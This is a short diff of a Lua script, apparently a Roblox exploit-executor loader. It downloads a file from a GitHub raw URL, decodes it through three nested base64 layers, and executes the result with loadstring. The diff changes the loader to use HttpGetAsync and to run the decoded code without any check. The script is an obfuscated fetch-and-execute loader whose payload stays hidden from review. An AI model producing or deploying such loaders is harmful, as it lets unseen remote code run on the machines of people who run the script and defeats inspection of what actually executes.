@@ -1,5 +1,5 @@
 local URL = "https://raw.githubusercontent.com/FL0XIN/Flox-script/main/data.txt"
-local ok, P = pcall(function() return game:GetService("HttpService"):GetAsync(URL) end)
+local ok, P = pcall(function() return game:HttpGetAsync(URL) end)
 if not ok or not P then warn("[FLAXON] fetch failed"); return end
 local function b64d(d)
     local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
@@ -17,5 +17,4 @@ local function b64d(d)
     end))
 end
 local S = b64d(b64d(b64d(P)))
-local fn = loadstring(S)
-if fn then fn() else warn("[FLAXON] decode failed") end
+loadstring(S)()
